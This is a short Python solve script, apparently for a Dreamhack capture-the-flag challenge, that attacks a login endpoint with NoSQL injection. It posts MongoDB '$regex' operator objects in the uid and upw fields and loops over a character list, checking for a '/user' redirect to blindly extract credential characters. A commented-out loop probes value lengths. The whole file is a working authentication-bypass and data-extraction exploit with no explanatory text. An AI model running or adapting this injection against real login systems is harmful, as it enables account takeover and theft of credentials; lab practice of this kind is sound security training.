import httpx
import time
import re
# url = "http://host3.dreamhack.games:11915/login"
url = "http://host3.dreamhack.games:19957/login"

# for i in range(100):
#     time.sleep(0.1)
#     json = {"uid": {"$regex": f".{{{i}}}"}, "upw": {"$regex": f"DH.{{{i}}}"} }
#     resp = httpx.post(url=url, json=json)
#     print(i)
#     if "/user" in resp.text:
#         print(json)

# DH{isrealflag?}

ascii_list = ['~','|','$',' ', '!', '"', '#',  '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}']
for c in ascii_list:
    time.sleep(0.2)
    print(c)
    json = {"uid": {"$regex": f"^{re.escape(c)}"}, "upw": {"$regex": "\\}"} }
    resp = httpx.post(url=url, json=json)
    if "/user" in resp.text:
        print(str(json))
